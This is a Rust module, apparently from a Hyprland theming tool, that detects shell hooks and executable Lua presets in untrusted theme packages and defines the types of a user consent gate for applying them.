//! What a theme package carries that can run code when it is applied
//! (`odd/tasks/theme-package-trust.md`, W1 — detect, W2 — the consent
//! gate below): [`inspect_theme_package`] reads a package, and
//! [`TrustGate`] decides whether an apply attempt proceeds, holds for
//! the warning, or is blocked behind it.
//!
//! A theme folder is UNTRUSTED input. Two things inside it execute when the
//! theme is applied:
//!
//! - A provider `settings.toml` (the shipped one is `noctalia-v5`) may carry
//!   a `[hooks]` section whose values are shell commands. The apply copies
//!   that file VERBATIM over the live one and then reloads, so a packaged
//!   hook runs on apply.
//! - A preset under `presets/<category>/` is installed into the user preset
//!   store (`PRESET_EXTENSIONS`: `*.lua` and `*.frag`) and — in the
//!   `animations` and `borders` categories — `cat`ed unvalidated into the
//!   assembled `overlay.lua` that Hyprland `dofile`s, so a `.frag` there
//!   runs Lua exactly like a `.lua`. Under `shaders/` the file content is
//!   never `cat`ed (see the filter), so it is not reported.
//!
//! [`inspect_theme_package`] reports both so the warning (W2) can word itself
//! from facts: the hook KEYS with their COMMAND TEXT, and the preset names.
//!
//! Honest limit, stated here and in the warning itself: this report feeds a
//! CONSENT GATE, not a sandbox. It says what a package carries; it cannot
//! make an accepted theme harmless — if the keeper confirms, the theme's code
//! runs as him.
//!
//! Contract of this module: PURE and READ-ONLY (no write, no directory is
//! ever created) and TOTAL — a missing, unreadable, malformed, empty or
//! non-UTF8 file never panics: it only narrows the report. Reading is
//! line-based like every other `settings.toml` reader in the repo (there is
//! no TOML crate), and it FAILS CLOSED: a hooks table the line reader
//! cannot read in full is reported as one conservative entry
//! (`push_unreadable_hooks`) instead of an empty report, because the gate
//! warns only when the report is non-empty and a silent gate over an
//! unreadable table is CRITICAL-1 with a different spelling.

use std::path::{Path, PathBuf};

/// One shell hook a provider's `settings.toml` declares.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHook {
    /// The provider directory that carries the file (e.g. `noctalia-v5`).
    pub provider: String,
    /// The `[hooks]` key (`started`, `colors_changed`, `shutdown`, …) —
    /// decoded when the file spells it as a TOML basic string with escapes
    /// (`"\u0073tarted"` is `started` to a real parser). The ONE exception
    /// is the conservative entry of an UNREADABLE hooks table, whose key
    /// is the literal `hooks table` (a note about a table, never an event
    /// that runs); see `push_unreadable_hooks`.
    pub key: String,
    /// The command text exactly as the file holds it, quotes stripped: a
    /// multi-line string arrives with its lines joined by newlines and its
    /// delimiter padding trimmed. For the conservative entry it is the
    /// honest statement that the table could not be fully read (file and
    /// line), not a command.
    pub command: String,
}

/// One preset file the package carries under `presets/<category>/` that the
/// report must name: every `*.lua`, plus a `*.frag` in a category the apply
/// `cat`s (the field keeps the name `lua_presets` — the gate's shape is
/// fixed; see the filter in [`lua_presets`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LuaPreset {
    /// The preset category directory (`animations`, `borders`, `shaders`).
    pub category: String,
    /// The file name (`Space.lua`, `evil.frag`).
    pub file_name: String,
}

impl LuaPreset {
    /// The theme-relative location of the preset (`presets/animations/x.lua`).
    pub fn theme_relative_path(&self) -> PathBuf {
        Path::new(crate::theme_presets::PRESETS_DIR)
            .join(&self.category)
            .join(&self.file_name)
    }
}

/// What a theme package carries that can execute when it is applied.
///
/// Shaped so the warning (W2) can be worded directly from it: the hook keys
/// and command texts under [`shell_hooks`](Self::shell_hooks), the preset
/// names and paths under [`lua_presets`](Self::lua_presets).
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct ThemeTrustReport {
    /// Every hooks command of every `providers/*/settings.toml` — spelled
    /// under `[hooks]` or as a root-level `hooks.*` key / `hooks = { … }`
    /// table — in provider-directory order (sorted) and file order inside a
    /// file. A hooks table the line reader CANNOT read in full appears as
    /// one clearly-named conservative entry (key `hooks table`, stating
    /// file + line) instead of an empty list: FAIL CLOSED, so the gate can
    /// never stay silent over a table nobody inspected.
    pub shell_hooks: Vec<ShellHook>,
    /// Every preset file under `presets/<category>/` the report must name —
    /// what the apply installs AND can execute: `*.lua` anywhere, plus
    /// `*.frag` in the categories whose fragment the scripts `cat` into
    /// `overlay.lua` — in [`crate::theme_presets::CATEGORIES`] order and
    /// file-name order inside a category (deterministic, so a warning reads
    /// the same twice).
    pub lua_presets: Vec<LuaPreset>,
}

impl ThemeTrustReport {
    /// Whether the package carries neither shell hooks nor Lua presets: such
    /// a theme applies exactly as it did before this detector existed.
    pub fn is_empty(&self) -> bool {
        self.shell_hooks.is_empty() && self.lua_presets.is_empty()
    }
}

/// Read `theme_dir` and report what the package carries. READ-ONLY: nothing
/// is written and no directory is created, for any input — a theme path that
/// does not exist simply yields an empty report.
pub fn inspect_theme_package(theme_dir: &Path) -> ThemeTrustReport {
    ThemeTrustReport {
        shell_hooks: shell_hooks(theme_dir),
        lua_presets: lua_presets(theme_dir),
    }
}

/// The `[hooks]` commands of every `providers/<provider>/settings.toml`.
/// A missing file is the normal shape (only `noctalia-v5` writes one); an
/// unreadable or non-UTF8 one is warned about and skipped.
fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(theme_dir.join("providers")) else {
        return out;
    };
    let mut providers: Vec<PathBuf> = entries
        .flatten()
        .map(|entry| entry.path())
        .filter(|path| path.is_dir())
        .collect();
    providers.sort();
    for provider_dir in providers {
        let provider = provider_dir
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_default();
        if provider.is_empty() {
            continue;
        }
        let settings = provider_dir.join("settings.toml");
        // W10b: the theme's `settings.toml` is an UNTRUSTED file. A missing
        // file is the normal shape (silent, as always); a NON-REGULAR one —
        // a FIFO named like it would block the gate forever on the open — or
        // one over W10's per-file bound is warned about and skipped, exactly
        // like an unreadable one. W10 owns the ONE set of limits and the ONE
        // error type.
        if !settings.exists() {
            continue;
        }
        match crate::theme_media::read_theme_record(&settings) {
            Ok(text) => out.extend(hooks_in_settings(&text, &provider, &settings)),
            Err(e) => tracing::warn!(
                "[theme-trust] cannot read {} (skipped): {}",
                settings.display(),
                e
            ),
        }
    }
    out
}

/// The hooks one `settings.toml` text declares, in file order — plus, when
/// a hooks table exists that this reader CANNOT read in full, one
/// conservative entry ([`push_unreadable_hooks`]) instead of silence.
///
/// One value can span LINES: a multi-line string (`"""` / `'''`) keeps every
/// line inside it as CONTENT — not a section header, not a comment, not a
/// `key = value` of its own — until its delimiter returns. The whole string
/// is the command of the key that opened it (Noctalia's TOML parser hands
/// exactly that to the shell).
///
/// The table can also be written WITHOUT a header, before the first
/// `[section]` line: the dotted key `hooks.started = "…"` and the inline
/// table `hooks = { started = "…" }` are the same `[hooks]` table to any
/// TOML parser, so both are read like a pair under the header (see
/// [`root_hooks`]). After a header the same text is
/// `<section>.hooks.started`, which Noctalia never executes, so it is left
/// alone.
///
/// Still line-based (no TOML crate), and it FAILS CLOSED on what it cannot
/// read: an inline table whose closing `}` lands on a later line is VALID
/// TOML under spec 1.1 — `toml` 1.1.2 (`+spec-1.1.0`, this repo's
/// lockfile) parses `hooks = {\n  started = "…"\n}` — so a reader that
/// cannot follow it across lines must report `push_unreadable_hooks`,
/// never an empty report: the gate warns only when the report is
/// non-empty, and the keeper cannot consent to a hooks table nobody
/// inspected. (W1c claimed such a file was invalid TOML Noctalia "rejects
/// outright"; that claim was FALSE for the spec-1.1 parser family — a
/// false claim in a security comment is itself a defect.)
///
/// One leading UTF-8 BOM is stripped first: U+FEFF is not
/// `char::is_whitespace`, so `trim()` never removed it and
/// `<BOM>hooks.started = "…"` slipped past both readers while `toml`
/// accepts the file (W1c-b).
fn hooks_in_settings(text: &str, provider: &str, file: &Path) -> Vec<ShellHook> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let mut out = Vec::new();
    let mut in_hooks = false;
    // Document ROOT: no `[section]` header has been seen yet. Only there do
    // the root-level spellings name the hooks table; under a section they
    // name `<section>.hooks.*`, which Noctalia never runs.
    let mut root = true;
    // An OPEN multi-line string: (the key it belongs to, the delimiter that
    // closes it, the content gathered so far, the opener line of the
    // root-level inline `hooks = { … }` table the string belongs to —
    // `Some` only while that table's `}` is still missing).
    let mut open: Option<(String, &'static str, String, Option<usize>)> = None;
    for (index, line) in text.split('\n').enumerate() {
        let line_no = index + 1;
        if open.is_some() {
            let ended_at = {
                let (_key, delimiter, content, _inline) = open.as_mut().expect("open is Some");
                match line.find(*delimiter) {
                    Some(at) => {
                        content.push_str(&line[..at]);
                        Some(at)
                    }
                    None => {
                        content.push('\n');
                        content.push_str(line);
                        None
                    }
                }
            };
            if let Some(at) = ended_at {
                let (key, delimiter, content, inline_opener) = open.take().expect("open is Some");
                push_shell_hook(&mut out, provider, &key, content.trim());
                // W1c-b FAIL CLOSED, deferred half: this string was an
                // entry of a root-level `hooks = { … }` table that opened
                // without its `}` (spec 1.1 allows the newline). The rest
                // of THIS line must close that table with nothing but
                // whitespace and separators before the `}` — anything else
                // (more entries, or no `}` at all) was never read, so the
                // conservative entry goes out beside what WAS read.
                if let Some(opener) = inline_opener {
                    let after = &line[at + delimiter.len()..];
                    let mut pieces = split_outer(after, '}');
                    let closes = pieces.len() > 1;
                    let residue = pieces.swap_remove(0);
                    let residue = residue
                        .trim()
                        .trim_matches(|c: char| c.is_whitespace() || c == ',');
                    if !closes || !residue.is_empty() {
                        push_unreadable_hooks(&mut out, provider, file, opener);
                    }
                }
            }
            continue;
        }
        if let Some(keys) = section_keys(line) {
            in_hooks = keys.first().map(String::as_str) == Some("hooks");
            root = false;
            continue;
        }
        if !in_hooks {
            if root {
                let mut unread_inline: Option<usize> = None;
                for item in root_hooks(line) {
                    match item {
                        RootHook::Pair(key, command) => {
                            push_shell_hook(&mut out, provider, &key, &command);
                        }
                        RootHook::OpenMulti {
                            key,
                            delimiter,
                            head,
                        } => open = Some((key, delimiter, head, None)),
                        RootHook::UnreadInline => unread_inline = Some(line_no),
                    }
                }
                if let Some(opener) = unread_inline {
                    match open.as_mut() {
                        // The opener line also opened a multi-line STRING:
                        // only the line where that string ends can still
                        // close the table (or prove it unreadable), so the
                        // decision is deferred there — no double warning
                        // and no wrong one.
                        Some(slot) => slot.3 = Some(opener),
                        // Nothing on this line could be read as an entry of
                        // the table: fail closed right here.
                        None => push_unreadable_hooks(&mut out, provider, file, opener),
                    }
                }
            }
            continue;
        }
        match hook_line(line) {
            HookLine::Pair(key, command) => push_shell_hook(&mut out, provider, &key, command),
            HookLine::OpenMulti {
                key,
                delimiter,
                head,
            } => open = Some((key, delimiter, head.to_string(), None)),
            HookLine::None => {}
        }
    }
    // An UNTERMINATED multi-line string is not valid TOML (Noctalia would
    // refuse the whole file), but this is a detector: report what can be
    // read — the same rule as an unterminated single-line quote. An inline
    // table whose string never ended never closed either: whatever the
    // table still carries was never read, so the conservative entry goes
    // out with it.
    if let Some((key, _delimiter, content, inline_opener)) = open {
        push_shell_hook(&mut out, provider, &key, content.trim());
        if let Some(opener) = inline_opener {
            push_unreadable_hooks(&mut out, provider, file, opener);
        }
    }
    out
}

/// Append one reported hook when the line actually carries a command: an
/// empty value is not a hook (the command text itself stays verbatim).
fn push_shell_hook(out: &mut Vec<ShellHook>, provider: &str, key: &str, command: &str) {
    if command.trim().is_empty() {
        return;
    }
    out.push(ShellHook {
        provider: provider.to_string(),
        key: key.to_string(),
        command: command.to_string(),
    });
}

/// The ONE conservative report entry emitted when the line reader KNOWS it
/// could not read a hooks table in full (W1c-b): for a form there is no
/// confident reading of — today the spec-1.1 multi-line inline table — it
/// must warn, never read as empty, because the gate warns only when the
/// report is non-empty and the keeper cannot consent to what nobody
/// inspected. It names a TABLE, not an event (`key` is `hooks table`, so
/// the warning line reads as a note, not as a hook that runs); it states
/// the file, the line where the table opens, and that the list may be
/// incomplete. It claims no protection and invents no command: it is an
/// honest "I could not read this", not a sandbox.
fn push_unreadable_hooks(out: &mut Vec<ShellHook>, provider: &str, file: &Path, line: usize) {
    out.push(ShellHook {
        provider: provider.to_string(),
        key: "hooks table".to_string(),
        command: format!(
            "the hooks table in {} (line {}) could not be fully read by this scan; \
             it may carry shell commands that are not listed here",
            file.display(),
            line
        ),
    });
}

/// The key parts a `settings.toml` header line declares, `None` for every
/// other line. House convention (same as `providers/noctalia.rs`): in a
/// machine-written file a `#` always starts a comment, so the code is the
/// line up to the first `#`.
///
/// Every part is decoded like every other key comparison ([`decode_key`])
/// and the caller reads the FIRST part, so all of these are the hooks
/// table — each one is to a real parser: a quoted header (`["hooks"]`,
/// `['hooks']`; keeping the quotes hid the whole section from the gate,
/// the original W1 finding), an escaped basic string (`["\u0068ooks"]`,
/// W1c-b), spaces around the dots (`[hooks . started]`) and a quoted
/// first part (`["hooks".started]`).
fn section_keys(line: &str) -> Option<Vec<String>> {
    let code = line.split('#').next().unwrap_or("").trim();
    let name = code.strip_prefix('[')?.strip_suffix(']')?.trim();
    Some(
        split_outer(name, '.')
            .iter()
            .map(|part| decode_key(part.trim()))
            .collect(),
    )
}

/// Strip ONE matching pair of surrounding quotes (`"` or `'`) from a table
/// name. ASCII quotes only, so byte slicing is always on a char boundary.
fn unquote(name: &str) -> &str {
    let bytes = name.as_bytes();
    if bytes.len() >= 2 && matches!(bytes[0], b'"' | b'\'') && bytes[0] == bytes[bytes.len() - 1]
    {
        return &name[1..bytes.len() - 1];
    }
    name
}

/// The key text a TOML parser builds from ONE key part — used wherever a
/// key is COMPARED or reported, because the comparison must see what a
/// real parser sees (W1c-b):
///
/// - a BASIC string (`"…"`) is DECODED: `\uXXXX`, `\UXXXXXXXX` and the
///   simple escapes (`\b \t \n \f \r \" \\`) are part of the key itself,
///   so `"\u0068ooks"` IS the table `hooks` (verified against `toml` 1.1.2,
///   `+spec-1.1.0` — this repo's lockfile);
/// - a LITERAL string (`'…'`) and a bare key come back with the quotes
///   stripped and NO decoding: TOML literal strings have no escapes, so
///   `'\u0068ooks'` is that literal key and must never be read as `hooks`
///   (the parser would not run it);
/// - an escape the parser would REJECT (wrong hex count, a surrogate
///   scalar) stays VERBATIM instead of decoding into a table name —
///   garbage input must not become a table this gate reports.
fn decode_key(part: &str) -> String {
    let bytes = part.as_bytes();
    if bytes.len() >= 2 && bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"' {
        return decode_basic_string(&part[1..bytes.len() - 1]);
    }
    unquote(part).to_string()
}

/// The content of a TOML BASIC string with its escapes applied. An unknown
/// escape (invalid TOML) is kept verbatim — backslash and character — so
/// an unreadable key stays unreadable instead of decoding into something
/// this detector would report.
fn decode_basic_string(content: &str) -> String {
    if !content.contains('\\') {
        return content.to_string();
    }
    let chars: Vec<char> = content.chars().collect();
    let mut out = String::with_capacity(content.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        i += 1;
        if c != '\\' {
            out.push(c);
            continue;
        }
        let Some(&escaped) = chars.get(i) else {
            out.push('\\');
            break;
        };
        i += 1;
        match escaped {
            'b' => out.push('\u{8}'),
            't' => out.push('\t'),
            'n' => out.push('\n'),
            'f' => out.push('\u{c}'),
            'r' => out.push('\r'),
            '"' => out.push('"'),
            '\\' => out.push('\\'),
            marker @ ('u' | 'U') => {
                let digits = if marker == 'u' { 4 } else { 8 };
                let rest = &chars[i..];
                if rest.len() >= digits && rest[..digits].iter().all(char::is_ascii_hexdigit) {
                    let hex: String = rest[..digits].iter().collect();
                    match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                        Some(decoded) => {
                            out.push(decoded);
                            i += digits;
                        }
                        // A surrogate or out-of-range scalar is not a
                        // character: keep the escape as text.
                        None => {
                            out.push('\\');
                            out.push(marker);
                        }
                    }
                } else {
                    out.push('\\');
                    out.push(marker);
                }
            }
            other => {
                out.push('\\');
                out.push(other);
            }
        }
    }
    out
}

/// One `key = value` line of a `[hooks]` section, as the line reader must
/// treat it.
enum HookLine<'a> {
    /// A complete single-line value: the key (decoded, [`decode_key`])
    /// and its command text.
    Pair(String, &'a str),
    /// A MULTI-LINE string (`"""` / `'''`) this line OPENS: the key it
    /// belongs to, the delimiter that closes it, and whatever content the
    /// opener line already carries after that delimiter.
    OpenMulti {
        key: String,
        delimiter: &'static str,
        head: &'a str,
    },
    /// Not a hook line: a comment, a blank line, no `=`, an empty key, an
    /// empty value, or an ARRAY value — `[hooks]` also holds data
    /// (`community_ids = [ … ]`) that Noctalia never executes, and reporting
    /// it as a command would make the warning lie.
    None,
}

/// One `key = value` line of a `[hooks]` section as [`HookLine`].
fn hook_line(line: &str) -> HookLine<'_> {
    // House convention (same as `providers/noctalia.rs`): in a
    // machine-written file a `#` always starts a comment, so the code is the
    // line up to the first `#`.
    let code = line.split('#').next().unwrap_or("").trim_end();
    if code.trim().is_empty() {
        return HookLine::None;
    }
    // `code` is a prefix of `line`, so the `=` index is valid in both.
    let Some(eq_at) = code.find('=') else {
        return HookLine::None;
    };
    let raw_key = code[..eq_at].trim();
    if raw_key.is_empty() {
        return HookLine::None;
    }
    // A quoted key (`"started" = …`) is legal TOML: report the bare name,
    // decoding a BASIC string first (W1c-b — `"\u0073tarted"` IS `started`
    // to a real parser); a LITERAL string key has no escapes and keeps its
    // text (see [`decode_key`]). An empty decoded key (`""`) is no key.
    let key = decode_key(raw_key);
    if key.is_empty() {
        return HookLine::None;
    }
    let after = &line[eq_at + 1..];
    let value_at = eq_at + 1 + (after.len() - after.trim_start().len());
    let rest = &line[value_at..];
    // A MULTI-LINE string (`"""` / `'''`) is one legal TOML value: closed on
    // this very line it is an ordinary single-line command, otherwise its
    // content continues on the lines below until the same delimiter comes
    // back. Checked before the single-quote branch, which would read the
    // opening `"""` as an empty (dropped) value.
    for delimiter in ["\"\"\"", "'''"] {
        if let Some(head) = rest.strip_prefix(delimiter) {
            return match head.find(delimiter) {
                Some(end) => HookLine::Pair(key, &head[..end]),
                None => HookLine::OpenMulti {
                    key,
                    delimiter,
                    head,
                },
            };
        }
    }
    match rest.chars().next() {
        Some(quote @ ('"' | '\'')) => {
            // An unterminated quote (garbage input): report the rest of the
            // line rather than dropping a real hook — this is a detector.
            let end = rest[1..]
                .find(quote)
                .map(|at| at + 1)
                .unwrap_or(rest.len());
            HookLine::Pair(key, &rest[1..end])
        }
        Some('[') => HookLine::None, // an array is data, never a command
        // A nested inline table (`started = { … }`) is configuration data —
        // a command is a STRING — so the `{` it starts with must never be
        // reported as a command. (The root-level `hooks = { … }` spelling
        // never reaches here: `root_hooks` reads it itself.)
        Some('{') => HookLine::None,
        Some(_) => {
            let end = rest
                .find(|c: char| c.is_whitespace() || c == '#')
                .unwrap_or(rest.len());
            if end == 0 {
                return HookLine::None;
            }
            HookLine::Pair(key, &rest[..end])
        }
        None => HookLine::None,
    }
}

/// One root-level hook spelling read from ONE line: a finished
/// `key = command` pair, a MULTI-LINE string this line OPENS, or the
/// signal that an inline `hooks = { … }` table spans LINES and cannot be
/// read — the caller keeps collecting the string and fails closed on the
/// table.
#[derive(Debug)]
enum RootHook {
    /// A complete single-line value: the key INSIDE the hooks table and
    /// its command text.
    Pair(String, String),
    /// A multi-line string (`"""` / `'''`) this line opens: the key it
    /// belongs to, the delimiter that closes it, and whatever content the
    /// opener line already carries after that delimiter.
    OpenMulti {
        key: String,
        delimiter: &'static str,
        head: String,
    },
    /// This line OPENS a root-level `hooks = { … }` inline table whose
    /// closing `}` is not on the line. Under TOML spec 1.1 that is a
    /// VALID multi-line inline table (verified: `toml` 1.1.2 parses it),
    /// which this line-based reader cannot follow across lines — so the
    /// caller must report [`push_unreadable_hooks`] instead of an empty
    /// report. If the same line also produced an [`RootHook::OpenMulti`],
    /// only the line where that string ends can still close the table:
    /// the caller defers the decision there instead of warning twice.
    UnreadInline,
}

/// The hooks ONE line written at the document ROOT declares (empty for
/// every other line). Two plain-TOML spellings name the `[hooks]` table
/// without any header, and Noctalia deserializes and runs both:
///
/// - the dotted key: `hooks.started = "…"` — also `hooks."started"`,
///   `"hooks"."started"` and `hooks . started`: a dot separates keys
///   whether it is bare, quoted or spaced;
/// - the inline table: `hooks = { started = "…", … }`.
///
/// A QUOTED key with a dot inside it (`"hooks.started"`) is ONE literal
/// key name, not the hooks table — Noctalia never runs it, so it is not
/// reported (reporting it would nag the keeper over nothing).
///
/// The VALUE rules are [`hook_line`]'s, so a command is reported exactly
/// like a pair under the `[hooks]` header; only the key differs: the report
/// carries the key INSIDE the hooks table (`started`), never the dotted
/// text (`hooks.started`). Keys are decoded like every comparison
/// ([`decode_key`]), so `"\u0068ooks"."started"` is the same spelling.
///
/// An inline table opened WITHOUT its `}` on the same line is a spec-1.1
/// multi-line table this reader cannot follow across lines: whatever is
/// readable on the opener line is still reported, plus
/// [`RootHook::UnreadInline`] so the caller fails closed instead of
/// reading as empty.
fn root_hooks(line: &str) -> Vec<RootHook> {
    // House convention (same as `hook_line`): a `#` starts a comment.
    let code = line.split('#').next().unwrap_or("").trim();
    if code.is_empty() {
        return Vec::new();
    }
    let Some(eq_at) = code.find('=') else {
        return Vec::new();
    };
    // Split the key on the dots OUTSIDE quotes: only those are real key
    // separators (see the doc above).
    let names: Vec<String> = split_outer(&code[..eq_at], '.')
        .iter()
        .map(|part| decode_key(part.trim()))
        .collect();
    if names.is_empty() || names.iter().any(|name| name.is_empty()) {
        return Vec::new();
    }
    // The dotted spelling: at least `hooks.<key>`.
    if names.len() >= 2 && names[0] == "hooks" {
        let plain = names[1..].join(".");
        return match hook_line(line) {
            HookLine::Pair(_, command) => vec![RootHook::Pair(plain, command.to_string())],
            HookLine::OpenMulti {
                delimiter, head, ..
            } => vec![RootHook::OpenMulti {
                key: plain,
                delimiter,
                head: head.to_string(),
            }],
            HookLine::None => Vec::new(),
        };
    }
    // The inline-table spelling: `hooks = { … }`. A `hooks` value that is
    // not a table (`hooks = "…"`, an array) is not the hooks table.
    if names.len() != 1 || names[0] != "hooks" {
        return Vec::new();
    }
    let value = code[eq_at + 1..].trim_start();
    let Some(body) = value.strip_prefix('{') else {
        return Vec::new();
    };
    // Cut the body at the closing `}` (quote-aware: a `}` inside a command
    // string closes nothing). A line WITHOUT that closing brace is not
    // "truncated garbage to parse as far as it goes": with the `}` on a
    // later line it is a VALID multi-line inline table under TOML spec 1.1
    // (the W1c comment claiming otherwise was false — `toml` 1.1.2 parses
    // it), and this reader cannot follow it. Whatever is readable on THIS
    // line is reported, plus `UnreadInline` to fail closed (see above).
    let mut pieces = split_outer(body, '}');
    let closed = pieces.len() > 1;
    let body = pieces.swap_remove(0);
    let mut out: Vec<RootHook> = split_outer(body, ',')
        .iter()
        .filter_map(|entry| inline_hook_entry(entry))
        .collect();
    if !closed {
        out.push(RootHook::UnreadInline);
    }
    out
}

/// One `key = value` entry inside a root-level `hooks = { … }` inline
/// table: the hook it declares, or `None` when it declares NO command —
/// no `=`, an empty key or value (a trailing comma leaves one empty), a
/// dotted (sub-table) key, a nested inline table, or an array: those are
/// data, never a command.
fn inline_hook_entry(entry: &str) -> Option<RootHook> {
    let entry = entry.trim();
    if entry.is_empty() {
        return None;
    }
    let eq_at = entry.find('=')?;
    let key_parts: Vec<String> = split_outer(&entry[..eq_at], '.')
        .iter()
        .map(|part| decode_key(part.trim()))
        .collect();
    // A dotted key inside the table (`sub.started = …`) defines a
    // sub-table, not a hook Noctalia's flat hooks map executes.
    if key_parts.len() != 1 || key_parts[0].is_empty() {
        return None;
    }
    let key = key_parts[0].clone();
    let value = entry[eq_at + 1..].trim_start();
    if value.is_empty() {
        return None;
    }
    // A MULTI-LINE string is a legal value inside an inline table (the
    // newline is within the value): closed on this entry it is one finished
    // command, otherwise it opens and the caller keeps collecting it.
    for delimiter in ["\"\"\"", "'''"] {
        if let Some(head) = value.strip_prefix(delimiter) {
            return Some(match head.find(delimiter) {
                Some(end) => RootHook::Pair(key, head[..end].to_string()),
                None => RootHook::OpenMulti {
                    key,
                    delimiter,
                    head: head.to_string(),
                },
            });
        }
    }
    match value.as_bytes()[0] {
        // A nested inline table or an array is data, never a command.
        b'{' | b'[' => None,
        b'"' | b'\'' => {
            // ONE quoted string: the delimiters stripped, a `\"` escape
            // kept verbatim (this reader reports what the FILE holds), and
            // an unterminated quote keeps the rest — the same tolerance
            // `hook_line` applies under `[hooks]`.
            let content = match closing_quote(value, 0) {
                Some(end) => &value[1..end - 1],
                None => &value[1..],
            };
            Some(RootHook::Pair(key, content.to_string()))
        }
        // A bare value (a boolean or a number): report the token, exactly
        // as `hook_line` reports an unquoted value under `[hooks]`.
        _ => {
            let token = value.split(char::is_whitespace).next().unwrap_or("");
            if token.is_empty() {
                None
            } else {
                Some(RootHook::Pair(key, token.to_string()))
            }
        }
    }
}

/// Split `text` on every `sep` at the OUTERMOST level — outside every
/// quoted string, array and nested table — so a `.`, a `,` or a `}` inside
/// a command string separates nothing. An unterminated string swallows the
/// rest of the text: nothing after it can be read (garbage input).
fn split_outer<'a>(text: &'a str, sep: char) -> Vec<&'a str> {
    let mut pieces = Vec::new();
    let mut start = 0;
    let mut depth = 0usize;
    let mut at = 0;
    while at < text.len() {
        let c = text[at..].chars().next().expect("at is on a char boundary");
        if c == '"' || c == '\'' {
            match closing_quote(text, at) {
                Some(end) => at = end,
                None => break,
            }
            continue;
        }
        match c {
            '{' | '[' => depth += 1,
            '}' | ']' => {
                if depth == 0 && c == sep {
                    pieces.push(&text[start..at]);
                    start = at + 1;
                } else {
                    depth = depth.saturating_sub(1);
                }
            }
            c if c == sep && depth == 0 => {
                pieces.push(&text[start..at]);
                start = at + 1;
            }
            _ => {}
        }
        at += c.len_utf8();
    }
    pieces.push(&text[start..]);
    pieces
}

/// The byte index just AFTER the string starting at `at` (whose first byte
/// is a `"` or a `'`), or `None` when it never closes. A multi-line
/// delimiter (`"""`, `'''`) is ONE string; inside a basic string (`"`) a
/// backslash escapes the next character (so a command's `\"` cannot end
/// the string early).
fn closing_quote(text: &str, at: usize) -> Option<usize> {
    let rest = &text[at..];
    let quote = *rest.as_bytes().first()? as char;
    for delimiter in ["\"\"\"", "'''"] {
        if rest.starts_with(delimiter) {
            return rest[delimiter.len()..]
                .find(delimiter)
                .map(|end| at + delimiter.len() + end + delimiter.len());
        }
    }
    let mut escaped = false;
    for (i, c) in rest[1..].char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        match c {
            '\\' if quote == '"' => escaped = true,
            c if c == quote => return Some(at + 1 + i + 1),
            _ => {}
        }
    }
    None
}

/// Every preset file a theme carries under `presets/<category>/` the report
/// must name, in [`crate::theme_presets::CATEGORIES`] order — exactly the
/// directories `install_theme_presets` reads on apply, so the report matches
/// what reaches the user preset store and, from there, `overlay.lua`.
fn lua_presets(theme_dir: &Path) -> Vec<LuaPreset> {
    let mut out = Vec::new();
    for category in crate::theme_presets::CATEGORIES {
        let dir = theme_dir
            .join(crate::theme_presets::PRESETS_DIR)
            .join(category);
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut names: Vec<String> = entries
            .flatten()
            .filter(|entry| entry.path().is_file())
            .filter_map(|entry| entry.file_name().to_str().map(str::to_string))
            .filter(|name| is_reported_preset(category, name))
            .collect();
        names.sort();
        out.extend(names.into_iter().map(|file_name| LuaPreset {
            category: category.to_string(),
            file_name,
        }));
    }
    out
}

/// Whether a preset file name is content the report must name: one of the
/// extensions the apply installs ([`crate::theme_presets::PRESET_EXTENSIONS`],
/// matched case-insensitively like the store), except `shaders/*.frag`.
///
/// THE ASYMMETRY, deliberate and verified against the scripts: `shader.sh`
/// never `cat`s a shader — it writes a validated Lua wrapper naming the
/// built-in shader path, so `shaders/*.frag` bytes reach the GPU as GLSL
/// and never `overlay.lua`, and stay out of the report. In `animations/`
/// and `borders/` the apply resolves the preset BY NAME, content-blind
/// (`hve_resolve_preset`), and `cat`s whatever file it finds into the
/// fragment `assemble.sh` assembles into the `overlay.lua` Hyprland
/// `dofile`s — a `.frag` carrying Lua there executes exactly like a
/// `.lua`. `shaders/*.lua` stays reported: it is Lua, the extension this
/// gate was built to surface.
fn is_reported_preset(category: &str, name: &str) -> bool {
    let Some(ext) = Path::new(name).extension().and_then(|ext| ext.to_str()) else {
        return false;
    };
    if !crate::theme_presets::PRESET_EXTENSIONS
        .iter()
        .any(|installed| ext.eq_ignore_ascii_case(installed))
    {
        return false;
    }
    !(category == "shaders" && ext.eq_ignore_ascii_case("frag"))
}

// ── W2: the consent gate ─────────────────────────────────────────────
//
// Detection alone is inert: every APPLY path must consult it and stop
// when the report is non-empty. The gate is the pure decision layer
// between the detector and the window — it holds an attempt, remembers
// it as pending, and only lets it through once the keeper has confirmed
// the warning (one-shot) or when the package carries nothing risky.
//
// It deliberately holds NO UI state and does NO I/O: the caller
// inspects the package itself, so the report the warning shows and the
// report consulted on the confirmed re-entry are both read fresh from
// disk at that moment. Contract: a theme that carries neither hooks nor
// Lua presets never reaches `Hold` — it applies exactly as it did
// before this module existed.

/// Which apply path an attempt came from (W2 gates both entry points).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApplyOrigin {
    /// `on_gallery_card_clicked` — the gallery card / mosaic tile.
    Gallery,
    /// `on_panel_apply_saved_theme` — the panel Save list.
    Panel,
}

/// An attempt the gate is holding until the keeper decides.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingApply {
    /// The theme name the attempt resolved to.
    pub name: String,
    /// The index the original callback received, to re-invoke it on confirm.
    pub index: i32,
    /// Which entry point must be re-invoked to apply after confirmation.
    pub origin: ApplyOrigin,
}

/// What the caller must do with one apply attempt.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GateDecision {
    /// Apply exactly as before: nothing risky, or a confirmed theme.
    Proceed,
    /// Do NOT apply: the warning is now showing for [`TrustGate::pending`].
    Hold,
    /// Do NOT apply: the warning is already open (the gate is modal —
    /// nothing is applied behind it until the keeper decides).
    Blocked,
}

